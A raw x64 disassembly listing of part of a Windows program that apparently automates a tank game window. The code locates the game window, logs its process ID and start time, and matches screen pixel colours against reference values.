0000000140001f81  call     qword ptr [rip + 0x60a9]                         ; 0x140008030 GDI32.dll!DeleteDC
0000000140001f87  mov      rdx, rdi                                        
0000000140001f8a  mov      rcx, r14                                        
0000000140001f8d  call     qword ptr [rip + 0x63b5]                         ; 0x140008348 USER32.dll!ReleaseDC
0000000140001f93  test     ebp, ebp                                        
0000000140001f95  je       0x140001f9c                                      ; 0x140001f9c
0000000140001f97  mov      al, r13b                                        
0000000140001f9a  jmp      0x140001fc6                                      ; 0x140001fc6
0000000140001f9c  mov      rcx, qword ptr [rip + 0xa2bd]                    ; 0x14000c260
0000000140001fa3  test     rcx, rcx                                        
0000000140001fa6  je       0x140001fb9                                      ; 0x140001fb9
0000000140001fa8  call     qword ptr [rip + 0x609a]                         ; 0x140008048 GDI32.dll!DeleteObject
0000000140001fae  mov      qword ptr [rip + 0xa2a7], 0                      ; 0x14000c260 | 0x0
0000000140001fb9  mov      qword ptr [rip + 0xa294], 0                      ; 0x14000c258 | 0x0
0000000140001fc4  xor      al, al                                          
0000000140001fc6  mov      rcx, qword ptr [rsp + 0x80]                     
0000000140001fce  xor      rcx, rsp                                        
0000000140001fd1  call     0x1400062f0                                      ; 0x1400062f0
0000000140001fd6  lea      r11, [rsp + 0x90]                               
0000000140001fde  mov      rbx, qword ptr [r11 + 0x30]                     
0000000140001fe2  mov      rbp, qword ptr [r11 + 0x40]                     
0000000140001fe6  mov      rsp, r11                                        
0000000140001fe9  pop      r15                                             
0000000140001feb  pop      r14                                             
0000000140001fed  pop      r13                                             
0000000140001fef  pop      rdi                                             
0000000140001ff0  pop      rsi                                             
0000000140001ff1  ret                                                      
0000000140001ff2  int3                                                     
0000000140001ff3  int3                                                     

; FUNCTION 0x140001ff4

0000000140001ff4  push     rbx                                             
0000000140001ff6  push     rbp                                             
0000000140001ff7  push     rsi                                             
0000000140001ff8  push     rdi                                             
0000000140001ff9  push     r12                                             
0000000140001ffb  push     r14                                             
0000000140001ffd  push     r15                                             
0000000140001fff  sub      rsp, 0x10                                        ; 0x10
0000000140002003  movd     xmm5, dword ptr [rip + 0xa21d]                   ; 0x14000c228
000000014000200b  xor      r15d, r15d                                      
000000014000200e  mov      r8d, dword ptr [rip + 0xa21b]                    ; 0x14000c230
0000000140002015  mov      edx, dword ptr [rip + 0xa25d]                    ; 0x14000c278
000000014000201b  mov      ebp, dword ptr [rip + 0xa233]                    ; 0x14000c254
0000000140002021  mov      eax, dword ptr [rip + 0xa255]                    ; 0x14000c27c
0000000140002027  cvtdq2pd xmm5, xmm5                                      
000000014000202b  movaps   xmmword ptr [rsp], xmm6                         
000000014000202f  movaps   xmm6, xmm2                                      
0000000140002032  movd     xmm2, dword ptr [rip + 0xa20a]                   ; 0x14000c244
000000014000203a  movaps   xmm4, xmm5                                      
000000014000203d  divsd    xmm4, xmm0                                      
0000000140002041  cvtdq2pd xmm2, xmm2                                      
0000000140002045  divsd    xmm5, xmm6                                      
0000000140002049  movaps   xmm0, xmm2                                      
000000014000204c  divsd    xmm0, xmm1                                      
0000000140002050  divsd    xmm2, xmm3                                      
0000000140002054  cvttsd2si ecx, xmm4                                       
0000000140002058  cvttsd2si r11d, xmm5                                      
000000014000205d  add      ecx, r8d                                        
0000000140002060  cmovns   r15d, ecx                                       
0000000140002064  xor      r9d, r9d                                        
0000000140002067  cvttsd2si ecx, xmm0                                       
000000014000206b  add      ecx, edx                                        
000000014000206d  cmovns   r9d, ecx                                        
0000000140002071  add      r11d, r8d                                       
0000000140002074  cmp      ebp, r11d                                       
0000000140002077  cvttsd2si ecx, xmm2                                       
000000014000207b  cmovl    r11d, ebp                                       
000000014000207f  add      ecx, edx                                        
0000000140002081  cmp      eax, ecx                                        
0000000140002083  cmovl    ecx, eax                                        
0000000140002086  cmp      r15d, r11d                                      
0000000140002089  jge      0x140002193                                      ; 0x140002193
000000014000208f  cmp      r9d, ecx                                        
0000000140002092  jge      0x140002193                                      ; 0x140002193
0000000140002098  mov      eax, r11d                                       
000000014000209b  sub      eax, r15d                                       
000000014000209e  cmp      eax, 2                                           ; 0x2
00000001400020a1  jl       0x140002193                                      ; 0x140002193
00000001400020a7  mov      eax, ecx                                        
00000001400020a9  sub      eax, r9d                                        
00000001400020ac  cmp      eax, 6                                           ; 0x6
00000001400020af  jl       0x140002193                                      ; 0x140002193
00000001400020b5  mov      r10, qword ptr [rip + 0xa19c]                    ; 0x14000c258
00000001400020bc  lea      esi, [rcx - 6]                                  
00000001400020bf  lea      edi, [r11 - 2]                                  
00000001400020c3  cmp      r9d, esi                                        
00000001400020c6  jg       0x140002193                                      ; 0x140002193
00000001400020cc  mov      r12d, 0xffffff                                   ; 0xffffff
00000001400020d2  mov      r8d, r15d                                       
00000001400020d5  cmp      r15d, edi                                       
00000001400020d8  jg       0x140002187                                      ; 0x140002187
00000001400020de  mov      edx, r9d                                        
00000001400020e1  imul     edx, ebp                                        
00000001400020e4  add      edx, r8d                                        
00000001400020e7  movsxd   rax, edx                                        
00000001400020ea  mov      ecx, dword ptr [r10 + rax*4]                    
00000001400020ee  and      ecx, r12d                                       
00000001400020f1  cmp      ecx, r12d                                       
00000001400020f4  jne      0x14000217b                                      ; 0x14000217b
00000001400020fa  lea      eax, [rdx + 1]                                  
00000001400020fd  movsxd   rcx, eax                                        
0000000140002100  mov      eax, dword ptr [r10 + rcx*4]                    
0000000140002104  and      eax, r12d                                       
0000000140002107  cmp      eax, r12d                                       
000000014000210a  jne      0x14000217b                                      ; 0x14000217b
000000014000210c  lea      edx, [r9 + 5]                                   
0000000140002110  imul     edx, ebp                                        
0000000140002113  add      edx, r8d                                        
0000000140002116  movsxd   rax, edx                                        
0000000140002119  mov      ecx, dword ptr [r10 + rax*4]                    
000000014000211d  and      ecx, r12d                                       
0000000140002120  cmp      ecx, r12d                                       
0000000140002123  jne      0x14000217b                                      ; 0x14000217b
0000000140002125  lea      eax, [rdx + 1]                                  
0000000140002128  movsxd   rcx, eax                                        
000000014000212b  mov      eax, dword ptr [r10 + rcx*4]                    
000000014000212f  and      eax, r12d                                       
0000000140002132  cmp      eax, r12d                                       
0000000140002135  jne      0x14000217b                                      ; 0x14000217b
0000000140002137  mov      bl, 1                                            ; 0x1
0000000140002139  xor      r11d, r11d                                      
000000014000213c  test     bl, bl                                          
000000014000213e  je       0x14000217b                                      ; 0x14000217b
0000000140002140  lea      eax, [r11 + r9]                                 
0000000140002144  imul     eax, ebp                                        
0000000140002147  movsxd   rdx, eax                                        
000000014000214a  movsxd   rax, r8d                                        
000000014000214d  lea      rcx, [r10 + rax*4]                              
0000000140002151  lea      r14, [rcx + rdx*4]                              
0000000140002155  xor      edx, edx                                        
0000000140002157  mov      ecx, dword ptr [r14 + rdx*4]                    
000000014000215b  and      ecx, r12d                                       
000000014000215e  cmp      ecx, r12d                                       
0000000140002161  jne      0x14000216c                                      ; 0x14000216c
0000000140002163  inc      edx                                             
0000000140002165  cmp      edx, 2                                           ; 0x2
0000000140002168  jl       0x140002157                                      ; 0x140002157
000000014000216a  jmp      0x14000216e                                      ; 0x14000216e
000000014000216c  xor      bl, bl                                          
000000014000216e  inc      r11d                                            
0000000140002171  cmp      r11d, 6                                          ; 0x6
0000000140002175  jl       0x14000213c                                      ; 0x14000213c
0000000140002177  test     bl, bl                                          
0000000140002179  jne      0x1400021a8                                      ; 0x1400021a8
000000014000217b  inc      r8d                                             
000000014000217e  cmp      r8d, edi                                        
0000000140002181  jle      0x1400020de                                      ; 0x1400020de
0000000140002187  inc      r9d                                             
000000014000218a  cmp      r9d, esi                                        
000000014000218d  jle      0x1400020d2                                      ; 0x1400020d2
0000000140002193  xor      al, al                                          
0000000140002195  movaps   xmm6, xmmword ptr [rsp]                         
0000000140002199  add      rsp, 0x10                                        ; 0x10
000000014000219d  pop      r15                                             
000000014000219f  pop      r14                                             
00000001400021a1  pop      r12                                             
00000001400021a3  pop      rdi                                             
00000001400021a4  pop      rsi                                             
00000001400021a5  pop      rbp                                             
00000001400021a6  pop      rbx                                             
00000001400021a7  ret                                                      
00000001400021a8  mov      al, 1                                            ; 0x1
00000001400021aa  jmp      0x140002195                                      ; 0x140002195

; FUNCTION 0x1400021ac

00000001400021ac  mov      qword ptr [rsp + 8], rbx                        
00000001400021b1  push     rbp                                             
00000001400021b2  lea      rbp, [rsp - 0x57]                               
00000001400021b7  sub      rsp, 0xd0                                        ; 0xd0
00000001400021be  mov      rax, qword ptr [rip + 0x9e7b]                    ; 0x14000c040
00000001400021c5  xor      rax, rsp                                        
00000001400021c8  mov      qword ptr [rbp + 0x47], rax                     
00000001400021cc  xor      edx, edx                                        
00000001400021ce  lea      rcx, [rip + 0x667b]                              ; 0x140008850 "TankWindowClass"
00000001400021d5  call     qword ptr [rip + 0x615d]                         ; 0x140008338 USER32.dll!FindWindowA
00000001400021db  mov      qword ptr [rip + 0xa056], rax                    ; 0x14000c238
00000001400021e2  test     rax, rax                                        
00000001400021e5  je       0x1400022fa                                      ; 0x1400022fa
00000001400021eb  mov      rcx, rax                                        
00000001400021ee  call     qword ptr [rip + 0x60d4]                         ; 0x1400082c8 USER32.dll!IsWindowVisible
00000001400021f4  test     eax, eax                                        
00000001400021f6  je       0x1400022fa                                      ; 0x1400022fa
00000001400021fc  mov      rcx, qword ptr [rip + 0xa035]                    ; 0x14000c238
0000000140002203  lea      rdx, [rbp - 0x39]                               
0000000140002207  mov      dword ptr [rbp - 0x39], 0                        ; 0x0
000000014000220e  call     qword ptr [rip + 0x6084]                         ; 0x140008298 USER32.dll!GetWindowThreadProcessId
0000000140002214  mov      r8d, dword ptr [rbp - 0x39]                     
0000000140002218  xor      edx, edx                                        
000000014000221a  mov      ecx, 0x400                                       ; 0x400
000000014000221f  call     qword ptr [rip + 0x5f4b]                         ; 0x140008170 KERNEL32.DLL!OpenProcess
0000000140002225  mov      rbx, rax                                        
0000000140002228  lea      r9, [rbp + 0xf]                                 
000000014000222c  lea      rax, [rbp + 7]                                  
0000000140002230  mov      rcx, rbx                                        
0000000140002233  lea      r8, [rbp + 0x17]                                
0000000140002237  mov      qword ptr [rsp + 0x20], rax                     
000000014000223c  lea      rdx, [rbp - 0x21]                               
0000000140002240  call     qword ptr [rip + 0x5e72]                         ; 0x1400080b8 KERNEL32.DLL!GetProcessTimes
0000000140002246  mov      rcx, rbx                                        
0000000140002249  call     qword ptr [rip + 0x5e29]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
000000014000224f  lea      rdx, [rbp + 0x1f]                               
0000000140002253  lea      rcx, [rbp - 0x21]                               
0000000140002257  call     qword ptr [rip + 0x5e0b]                         ; 0x140008068 KERNEL32.DLL!FileTimeToSystemTime
000000014000225d  lea      r8, [rbp - 0x31]                                
0000000140002261  xor      ecx, ecx                                        
0000000140002263  lea      rdx, [rbp + 0x1f]                               
0000000140002267  call     qword ptr [rip + 0x5e3b]                         ; 0x1400080a8 KERNEL32.DLL!SystemTimeToTzSpecificLocalTime
000000014000226d  movzx    ecx, word ptr [rbp - 0x27]                      
0000000140002271  movzx    edx, word ptr [rbp - 0x29]                      
0000000140002275  movzx    eax, word ptr [rbp - 0x25]                      
0000000140002279  movzx    r10d, word ptr [rbp - 0x2b]                     
000000014000227e  movzx    r9d, word ptr [rbp - 0x2f]                      
0000000140002283  movzx    r8d, word ptr [rbp - 0x31]                      
0000000140002288  mov      dword ptr [rsp + 0x38], eax                     
000000014000228c  mov      dword ptr [rsp + 0x30], ecx                     
0000000140002290  lea      rcx, [rbp + 0x2f]                               
0000000140002294  mov      dword ptr [rsp + 0x28], edx                     
0000000140002298  lea      rdx, [rip + 0x6591]                              ; 0x140008830 "%d-%02d-%02d %02d:%02d:%02d"
000000014000229f  mov      dword ptr [rsp + 0x20], r10d                    
00000001400022a4  call     0x140004620                                      ; 0x140004620
00000001400022a9  lea      rdx, [rbp + 0x2f]                               
00000001400022ad  lea      rcx, [rbp - 0x19]                               
00000001400022b1  call     0x140004c6c                                      ; 0x140004c6c
00000001400022b6  cmp      qword ptr [rbp - 1], 0xf                         ; 0xf
00000001400022bb  lea      r9, [rbp - 0x19]                                
00000001400022bf  mov      r8, qword ptr [rip + 0x9f72]                     ; 0x14000c238
00000001400022c6  lea      rcx, [rip + 0x6593]                              ; 0x140008860 "PID：%d HWND：0x%08llX 启动时间：%s"
00000001400022cd  cmova    r9, qword ptr [rbp - 0x19]                      
00000001400022d2  mov      edx, dword ptr [rbp - 0x39]                     
00000001400022d5  call     0x140001474                                      ; 0x140001474
00000001400022da  mov      cl, 1                                            ; 0x1
00000001400022dc  call     0x140001828                                      ; 0x140001828
00000001400022e1  call     qword ptr [rip + 0x6269]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400022e7  lea      rcx, [rbp - 0x19]                               
00000001400022eb  mov      dword ptr [rip + 0x9f5f], eax                    ; 0x14000c250
00000001400022f1  call     0x140004b70                                      ; 0x140004b70
00000001400022f6  mov      al, 1                                            ; 0x1
00000001400022f8  jmp      0x1400022fc                                      ; 0x1400022fc
00000001400022fa  xor      al, al                                          
00000001400022fc  mov      rcx, qword ptr [rbp + 0x47]                     
0000000140002300  xor      rcx, rsp                                        
0000000140002303  call     0x1400062f0                                      ; 0x1400062f0
0000000140002308  mov      rbx, qword ptr [rsp + 0xe0]                     
0000000140002310  add      rsp, 0xd0                                        ; 0xd0
0000000140002317  pop      rbp                                             
0000000140002318  ret                                                      
0000000140002319  int3                                                     
000000014000231a  int3                                                     
000000014000231b  int3                                                     

; FUNCTION 0x14000231c

000000014000231c  sub      rsp, 0x28                                        ; 0x28
0000000140002320  mov      cl, 1                                            ; 0x1
0000000140002322  call     0x140001828                                      ; 0x140001828
0000000140002327  cmp      byte ptr [rip + 0x9d86], 0                       ; 0x14000c0b4 | 0x0
000000014000232e  jne      0x140002337                                      ; 0x140002337
0000000140002330  xor      r8d, r8d                                        
0000000140002333  xor      edx, edx                                        
0000000140002335  jmp      0x140002355                                      ; 0x140002355
0000000140002337  cmp      byte ptr [rip + 0x9ef6], 0                       ; 0x14000c234 | 0x0
000000014000233e  je       0x140002348                                      ; 0x140002348
0000000140002340  xor      edx, edx                                        
0000000140002342  lea      r8d, [rdx + 2]                                  
0000000140002346  jmp      0x140002355                                      ; 0x140002355
0000000140002348  mov      rdx, qword ptr [rip + 0x9ee9]                    ; 0x14000c238
000000014000234f  mov      r8d, 1                                           ; 0x1
0000000140002355  add      rsp, 0x28                                        ; 0x28
0000000140002359  jmp      0x140001de0                                      ; 0x140001de0
000000014000235e  int3                                                     
000000014000235f  int3                                                     

; FUNCTION 0x140002360

0000000140002360  sub      rsp, 0x28                                        ; 0x28
0000000140002364  mov      rcx, qword ptr [rip + 0x9ef5]                    ; 0x14000c260
000000014000236b  test     rcx, rcx                                        
000000014000236e  je       0x140002381                                      ; 0x140002381
0000000140002370  call     qword ptr [rip + 0x5cd2]                         ; 0x140008048 GDI32.dll!DeleteObject
0000000140002376  mov      qword ptr [rip + 0x9edf], 0                      ; 0x14000c260 | 0x0
0000000140002381  mov      qword ptr [rip + 0x9ecc], 0                      ; 0x14000c258 | 0x0
000000014000238c  add      rsp, 0x28                                        ; 0x28
0000000140002390  ret                                                      
0000000140002391  int3                                                     
0000000140002392  int3                                                     
0000000140002393  int3                                                     
0000000140002394  movsd    xmm4, qword ptr [rip + 0x6e7c]                   ; 0x140009218
000000014000239c  mov      r11d, r8d                                       
000000014000239f  ucomisd  xmm0, xmm4                                      
00000001400023a3  movaps   xmm2, xmm0                                      
00000001400023a6  xorps    xmm3, xmm3                                      
00000001400023a9  jp       0x1400023bf                                      ; 0x1400023bf
00000001400023ab  jne      0x1400023bf                                      ; 0x1400023bf
00000001400023ad  mov      eax, dword ptr [rip + 0x9e75]                    ; 0x14000c228
00000001400023b3  dec      eax                                             
00000001400023b5  movd     xmm2, eax                                       
00000001400023b9  cvtdq2pd xmm2, xmm2                                      
00000001400023bd  jmp      0x1400023da                                      ; 0x1400023da
00000001400023bf  ucomisd  xmm2, xmm3                                      
00000001400023c3  jp       0x1400023c7                                      ; 0x1400023c7
00000001400023c5  je       0x1400023da                                      ; 0x1400023da
00000001400023c7  movd     xmm0, dword ptr [rip + 0x9e59]                   ; 0x14000c228
00000001400023cf  cvtdq2pd xmm0, xmm0                                      
00000001400023d3  divsd    xmm0, xmm2                                      
00000001400023d7  movaps   xmm2, xmm0                                      
00000001400023da  ucomisd  xmm1, xmm4                                      
00000001400023de  jp       0x1400023f4                                      ; 0x1400023f4
00000001400023e0  jne      0x1400023f4                                      ; 0x1400023f4
00000001400023e2  mov      eax, dword ptr [rip + 0x9e5c]                    ; 0x14000c244
00000001400023e8  dec      eax                                             
00000001400023ea  movd     xmm1, eax                                       
00000001400023ee  cvtdq2pd xmm1, xmm1                                      
00000001400023f2  jmp      0x14000240f                                      ; 0x14000240f
00000001400023f4  ucomisd  xmm1, xmm3                                      
00000001400023f8  jp       0x1400023fc                                      ; 0x1400023fc
00000001400023fa  je       0x14000240f                                      ; 0x14000240f
00000001400023fc  movd     xmm0, dword ptr [rip + 0x9e40]                   ; 0x14000c244
0000000140002404  cvtdq2pd xmm0, xmm0                                      
0000000140002408  divsd    xmm0, xmm1                                      
000000014000240c  movaps   xmm1, xmm0                                      
000000014000240f  mov      r9, qword ptr [rip + 0x9e42]                     ; 0x14000c258
0000000140002416  test     r9, r9                                          
0000000140002419  je       0x140002457                                      ; 0x140002457
000000014000241b  cvttsd2si r8, xmm2                                        
0000000140002420  add      r8d, dword ptr [rip + 0x9e09]                    ; 0x14000c230
0000000140002427  js       0x140002457                                      ; 0x140002457
0000000140002429  cvttsd2si rdx, xmm1                                       
000000014000242e  add      edx, dword ptr [rip + 0x9e44]                    ; 0x14000c278
0000000140002434  js       0x140002457                                      ; 0x140002457
0000000140002436  mov      eax, dword ptr [rip + 0x9e18]                    ; 0x14000c254
000000014000243c  cmp      r8d, eax                                        
000000014000243f  jge      0x140002457                                      ; 0x140002457
0000000140002441  cmp      edx, dword ptr [rip + 0x9e35]                    ; 0x14000c27c
0000000140002447  jge      0x140002457                                      ; 0x140002457
0000000140002449  imul     eax, edx                                        
000000014000244c  add      eax, r8d                                        
000000014000244f  cdqe                                                     
0000000140002451  mov      r10d, dword ptr [r9 + rax*4]                    
0000000140002455  jmp      0x14000245b                                      ; 0x14000245b
0000000140002457  or       r10d, 0xffffffff                                 ; 0xffffffff
000000014000245b  mov      eax, r10d                                       
000000014000245e  sar      eax, 8                                           ; 0x8
0000000140002461  movzx    ecx, al                                         
0000000140002464  mov      eax, r11d                                       
0000000140002467  sar      eax, 8                                           ; 0x8
000000014000246a  movzx    edx, al                                         
000000014000246d  sub      edx, ecx                                        
000000014000246f  mov      eax, edx                                        
0000000140002471  neg      eax                                             
0000000140002473  cmovs    eax, edx                                        
0000000140002476  imul     r8d, eax, 0x3b                                   ; 0x3b
000000014000247a  mov      eax, r10d                                       
000000014000247d  sar      eax, 0x10                                        ; 0x10
0000000140002480  movzx    ecx, al                                         
0000000140002483  mov      eax, r11d                                       
0000000140002486  sar      eax, 0x10                                        ; 0x10
0000000140002489  movzx    edx, al                                         
000000014000248c  sub      edx, ecx                                        
000000014000248e  movzx    ecx, r11b                                       
0000000140002492  mov      eax, edx                                        
0000000140002494  neg      eax                                             
0000000140002496  cmovs    eax, edx                                        
0000000140002499  imul     eax, eax, 0x1e                                   ; 0x1e
000000014000249c  add      r8d, eax                                        
000000014000249f  movzx    eax, r10b                                       
00000001400024a3  sub      ecx, eax                                        
00000001400024a5  mov      eax, ecx                                        
00000001400024a7  neg      eax                                             
00000001400024a9  cmovs    eax, ecx                                        
00000001400024ac  imul     eax, eax, 0xb                                    ; 0xb
00000001400024af  add      r8d, eax                                        
00000001400024b2  cmp      r8d, 0x44c                                       ; 0x44c
00000001400024b9  setle    al                                              
00000001400024bc  ret                                                      
00000001400024bd  int3                                                     
00000001400024be  int3                                                     
00000001400024bf  int3                                                     

; FUNCTION 0x1400024c0

00000001400024c0  mov      qword ptr [rsp + 8], rbx                        
00000001400024c5  mov      qword ptr [rsp + 0x10], rdi                     
00000001400024ca  movsd    xmm4, qword ptr [rip + 0x6d46]                   ; 0x140009218
00000001400024d2  mov      ebx, r9d                                        
00000001400024d5  ucomisd  xmm0, xmm4                                      
00000001400024d9  mov      edi, r8d                                        
00000001400024dc  movaps   xmm2, xmm0                                      
00000001400024df  xorps    xmm3, xmm3                                      
00000001400024e2  jp       0x1400024f8                                      ; 0x1400024f8
00000001400024e4  jne      0x1400024f8                                      ; 0x1400024f8
00000001400024e6  mov      eax, dword ptr [rip + 0x9d3c]                    ; 0x14000c228
00000001400024ec  dec      eax                                             
00000001400024ee  movd     xmm2, eax                                       
00000001400024f2  cvtdq2pd xmm2, xmm2                                      
00000001400024f6  jmp      0x140002513                                      ; 0x140002513
00000001400024f8  ucomisd  xmm2, xmm3                                      
00000001400024fc  jp       0x140002500                                      ; 0x140002500
00000001400024fe  je       0x140002513                                      ; 0x140002513
0000000140002500  movd     xmm0, dword ptr [rip + 0x9d20]                   ; 0x14000c228
0000000140002508  cvtdq2pd xmm0, xmm0                                      
000000014000250c  divsd    xmm0, xmm2                                      
0000000140002510  movaps   xmm2, xmm0                                      
0000000140002513  ucomisd  xmm1, xmm4                                      
0000000140002517  jp       0x14000252d                                      ; 0x14000252d
0000000140002519  jne      0x14000252d                                      ; 0x14000252d
000000014000251b  mov      eax, dword ptr [rip + 0x9d23]                    ; 0x14000c244
0000000140002521  dec      eax                                             
0000000140002523  movd     xmm1, eax                                       
0000000140002527  cvtdq2pd xmm1, xmm1                                      
000000014000252b  jmp      0x140002548                                      ; 0x140002548
000000014000252d  ucomisd  xmm1, xmm3                                      
0000000140002531  jp       0x140002535                                      ; 0x140002535
0000000140002533  je       0x140002548                                      ; 0x140002548
0000000140002535  movd     xmm0, dword ptr [rip + 0x9d07]                   ; 0x14000c244
000000014000253d  cvtdq2pd xmm0, xmm0                                      
0000000140002541  divsd    xmm0, xmm1                                      
0000000140002545  movaps   xmm1, xmm0                                      
0000000140002548  mov      r9, qword ptr [rip + 0x9d09]                     ; 0x14000c258
000000014000254f  test     r9, r9                                          
0000000140002552  je       0x140002590                                      ; 0x140002590
0000000140002554  cvttsd2si r8, xmm2                                        
0000000140002559  add      r8d, dword ptr [rip + 0x9cd0]                    ; 0x14000c230
0000000140002560  js       0x140002590                                      ; 0x140002590
0000000140002562  cvttsd2si rdx, xmm1                                       
0000000140002567  add      edx, dword ptr [rip + 0x9d0b]                    ; 0x14000c278
000000014000256d  js       0x140002590                                      ; 0x140002590
000000014000256f  mov      eax, dword ptr [rip + 0x9cdf]                    ; 0x14000c254
0000000140002575  cmp      r8d, eax                                        
0000000140002578  jge      0x140002590                                      ; 0x140002590
000000014000257a  cmp      edx, dword ptr [rip + 0x9cfc]                    ; 0x14000c27c
0000000140002580  jge      0x140002590                                      ; 0x140002590
0000000140002582  imul     eax, edx                                        
0000000140002585  add      eax, r8d                                        
0000000140002588  cdqe                                                     
000000014000258a  mov      ecx, dword ptr [r9 + rax*4]                     
000000014000258e  jmp      0x140002593                                      ; 0x140002593
0000000140002590  or       ecx, 0xffffffff                                  ; 0xffffffff
0000000140002593  mov      eax, ecx                                        
0000000140002595  movzx    r10d, cl                                        
0000000140002599  sar      eax, 0x10                                        ; 0x10
000000014000259c  movzx    r9d, al                                         
00000001400025a0  mov      eax, edi                                        
00000001400025a2  sar      eax, 8                                           ; 0x8
00000001400025a5  sar      ecx, 8                                           ; 0x8
00000001400025a8  movzx    r11d, cl                                        
00000001400025ac  movzx    ecx, al                                         
00000001400025af  sub      ecx, r11d                                       
00000001400025b2  mov      eax, ecx                                        
00000001400025b4  neg      eax                                             
00000001400025b6  cmovs    eax, ecx                                        
00000001400025b9  imul     edx, eax, 0x3b                                   ; 0x3b
00000001400025bc  mov      eax, edi                                        
00000001400025be  sar      eax, 0x10                                        ; 0x10
00000001400025c1  movzx    ecx, al                                         
00000001400025c4  sub      ecx, r9d                                        
00000001400025c7  mov      eax, ecx                                        
00000001400025c9  neg      eax                                             
00000001400025cb  cmovs    eax, ecx                                        
00000001400025ce  movzx    ecx, dil                                        
00000001400025d2  imul     eax, eax, 0x1e                                   ; 0x1e
00000001400025d5  sub      ecx, r10d                                       
00000001400025d8  mov      edi, 0x44c                                       ; 0x44c
00000001400025dd  add      edx, eax                                        
00000001400025df  mov      eax, ecx                                        
00000001400025e1  neg      eax                                             
00000001400025e3  cmovs    eax, ecx                                        
00000001400025e6  imul     eax, eax, 0xb                                    ; 0xb
00000001400025e9  add      edx, eax                                        
00000001400025eb  cmp      edx, edi                                        
00000001400025ed  jle      0x1400026de                                      ; 0x1400026de
00000001400025f3  mov      eax, ebx                                        
00000001400025f5  sar      eax, 8                                           ; 0x8
00000001400025f8  movzx    ecx, al                                         
00000001400025fb  sub      ecx, r11d                                       
00000001400025fe  mov      eax, ecx                                        
0000000140002600  neg      eax                                             
0000000140002602  cmovs    eax, ecx                                        
0000000140002605  imul     edx, eax, 0x3b                                   ; 0x3b
0000000140002608  mov      eax, ebx                                        
000000014000260a  sar      eax, 0x10                                        ; 0x10
000000014000260d  movzx    ecx, al                                         
0000000140002610  sub      ecx, r9d                                        
0000000140002613  mov      eax, ecx                                        
0000000140002615  neg      eax                                             
0000000140002617  cmovs    eax, ecx                                        
000000014000261a  movzx    ecx, bl                                         
000000014000261d  imul     eax, eax, 0x1e                                   ; 0x1e
0000000140002620  sub      ecx, r10d                                       
0000000140002623  add      edx, eax                                        
0000000140002625  mov      eax, ecx                                        
0000000140002627  neg      eax                                             
0000000140002629  cmovs    eax, ecx                                        
000000014000262c  imul     eax, eax, 0xb                                    ; 0xb
000000014000262f  add      edx, eax                                        
0000000140002631  cmp      edx, edi                                        
0000000140002633  jle      0x1400026de                                      ; 0x1400026de
0000000140002639  mov      r8d, dword ptr [rsp + 0x28]                     
000000014000263e  test     r8d, r8d                                        
0000000140002641  je       0x140002688                                      ; 0x140002688
0000000140002643  mov      eax, r8d                                        
0000000140002646  sar      eax, 8                                           ; 0x8
0000000140002649  movzx    ecx, al                                         
000000014000264c  sub      ecx, r11d                                       
000000014000264f  mov      eax, ecx                                        
0000000140002651  neg      eax                                             
0000000140002653  cmovs    eax, ecx                                        
0000000140002656  imul     edx, eax, 0x3b                                   ; 0x3b
0000000140002659  mov      eax, r8d                                        
000000014000265c  sar      eax, 0x10                                        ; 0x10
000000014000265f  movzx    ecx, al                                         
0000000140002662  sub      ecx, r9d                                        
0000000140002665  mov      eax, ecx                                        
0000000140002667  neg      eax                                             
0000000140002669  cmovs    eax, ecx                                        
000000014000266c  movzx    ecx, r8b                                        
0000000140002670  imul     eax, eax, 0x1e                                   ; 0x1e
0000000140002673  sub      ecx, r10d                                       
0000000140002676  add      edx, eax                                        
0000000140002678  mov      eax, ecx                                        
000000014000267a  neg      eax                                             
000000014000267c  cmovs    eax, ecx                                        
000000014000267f  imul     eax, eax, 0xb                                    ; 0xb
0000000140002682  add      edx, eax                                        
0000000140002684  cmp      edx, edi                                        
0000000140002686  jle      0x1400026de                                      ; 0x1400026de
0000000140002688  mov      r8d, dword ptr [rsp + 0x30]                     
000000014000268d  test     r8d, r8d                                        
0000000140002690  je       0x1400026da                                      ; 0x1400026da
0000000140002692  mov      eax, r8d                                        
0000000140002695  sar      eax, 8                                           ; 0x8
0000000140002698  movzx    ecx, al                                         
000000014000269b  sub      ecx, r11d                                       
000000014000269e  mov      eax, ecx                                        
00000001400026a0  neg      eax                                             
00000001400026a2  cmovs    eax, ecx                                        
00000001400026a5  imul     edx, eax, 0x3b                                   ; 0x3b
00000001400026a8  mov      eax, r8d                                        
00000001400026ab  sar      eax, 0x10                                        ; 0x10
00000001400026ae  movzx    ecx, al                                         
00000001400026b1  sub      ecx, r9d                                        
00000001400026b4  mov      eax, ecx                                        
00000001400026b6  neg      eax                                             
00000001400026b8  cmovs    eax, ecx                                        
00000001400026bb  movzx    ecx, r8b                                        
00000001400026bf  imul     eax, eax, 0x1e                                   ; 0x1e
00000001400026c2  sub      ecx, r10d                                       
00000001400026c5  add      edx, eax                                        
00000001400026c7  mov      eax, ecx                                        
00000001400026c9  neg      eax                                             
00000001400026cb  cmovs    eax, ecx                                        
00000001400026ce  imul     eax, eax, 0xb                                    ; 0xb
00000001400026d1  add      edx, eax                                        
00000001400026d3  cmp      edx, edi                                        
00000001400026d5  setle    al                                              
00000001400026d8  jmp      0x1400026e0                                      ; 0x1400026e0
00000001400026da  xor      al, al                                          
00000001400026dc  jmp      0x1400026e0                                      ; 0x1400026e0
00000001400026de  mov      al, 1                                            ; 0x1
00000001400026e0  mov      rbx, qword ptr [rsp + 8]                        
00000001400026e5  mov      rdi, qword ptr [rsp + 0x10]                     
00000001400026ea  ret                                                      
00000001400026eb  int3                                                     

; FUNCTION 0x1400026ec

00000001400026ec  mov      qword ptr [rsp + 8], rbx                        
00000001400026f1  push     rdi                                             
00000001400026f2  sub      rsp, 0x20                                        ; 0x20
00000001400026f6  mov      edi, ecx                                        
00000001400026f8  call     qword ptr [rip + 0x5e52]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400026fe  mov      dword ptr [rip + 0x9b4c], eax                    ; 0x14000c250
0000000140002704  call     qword ptr [rip + 0x5e46]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000270a  add      edi, eax                                        
000000014000270c  jmp      0x140002722                                      ; 0x140002722
000000014000270e  mov      ecx, 1                                           ; 0x1
0000000140002713  call     qword ptr [rip + 0x5aa7]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140002719  cmp      byte ptr [rip + 0x9b15], 0                       ; 0x14000c235 | 0x0
